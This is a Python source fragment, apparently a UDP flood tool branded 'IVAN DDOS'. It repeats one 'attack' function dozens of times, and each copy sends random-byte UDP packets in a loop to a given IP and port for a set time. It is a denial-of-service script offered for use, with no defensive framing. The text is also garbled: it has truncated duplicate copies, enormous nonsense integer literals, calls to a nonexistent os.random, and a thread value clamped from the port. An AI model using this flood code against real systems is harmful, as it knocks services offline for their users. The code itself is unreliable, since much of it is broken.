        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
